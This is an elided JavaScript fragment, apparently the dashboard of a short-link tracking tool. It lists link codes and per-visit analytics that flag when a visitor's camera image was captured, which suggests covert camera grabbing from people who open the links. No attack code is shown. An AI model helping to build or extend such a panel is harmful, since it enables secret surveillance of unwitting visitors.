...
// ========== DATA DISPLAY FUNCTIONS (Called by bottom buttons) ==========

// Update display area header and content
                ...
                <div style="margin-top: 12px;">
                    ...
                    ${linksList.map(code => `
                        <div class="data-item" style="margin-bottom: 6px;">
                            <div class="data-item-header">
                                <span class="data-item-code">/${code}</span>
                            </div>
                            <div class="data-item-actions">
                                <button class="data-btn-sm" onclick="viewAnalytics('${code}')">View Details</button>
                            </div>
                        </div>
                    `).join('')}
                </div>
...
// View Analytics for specific link - Shows detailed data
        ...
        if (analytics.length === 0) {
            ...
            html += analytics.map(v => `
                <div class="data-item">
                    ...
                    ${v.captured_image ? '<div class="data-item-stats" style="color: #00ff41;">📸 Camera captured!</div>' : ''}
                </div>
            `).join('');
        }
